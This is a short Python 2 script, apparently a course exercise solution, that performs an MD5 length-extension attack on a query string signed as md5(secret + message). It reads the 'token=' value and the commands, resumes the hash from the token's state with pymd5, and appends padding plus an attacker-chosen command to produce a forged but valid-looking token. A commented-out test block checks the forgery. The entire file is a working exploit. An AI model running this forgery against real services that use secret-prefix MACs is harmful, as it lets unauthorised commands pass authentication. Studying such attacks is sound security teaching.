import sys
from pymd5 import md5, padding
import urllib

if len(sys.argv) != 4:
    print("Error: Invalid number of arguments")
    sys.exit()

with open(sys.argv[1]) as f:
    query = f.read().strip()
with open(sys.argv[2]) as f:
    command3 = f.read().strip()

token = query[query.index("=") + 1:query.index("&")]
commands = query[query.index("&")+1:]
commands_bits = (len(commands) + 8) * 8

h = md5(state=token.decode("hex"), count=len(padding(commands_bits)) * 8 + commands_bits)
h.update(command3)
# print(h.hexdigest())
new_query = "token=" + h.hexdigest() + '&' + commands + urllib.quote(padding(commands_bits)) + command3

with open(sys.argv[3], 'w') as f:
    f.write(new_query)
    
########### Test ############
#
# message = query[query.index("&"):]
# message = "12345678" + message
# print("Origin: " + message)
# token = md5(message).hexdigest()
#
# h = md5(state=token.decode("hex"), count=512)
# h.update(command3)
# print("Attack: " + h.hexdigest())
#
# message = message + padding(len(message) * 8) + command3
# print("After: " + md5(message).hexdigest())

